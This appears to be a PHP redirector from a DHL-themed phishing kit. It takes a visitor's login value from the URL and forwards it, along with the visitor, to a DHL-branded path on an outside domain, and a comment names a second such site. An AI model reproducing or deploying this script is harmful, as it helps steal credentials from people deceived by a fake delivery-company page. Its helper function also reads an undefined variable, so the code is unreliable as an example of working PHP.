<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($uid, $find);
$loginID = substr($uid, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
header("Location: http://www.bannlalisa.com/Apps/DHL/?login=$login");

##https://familie-parolini.ch/Apps/DHL/

?>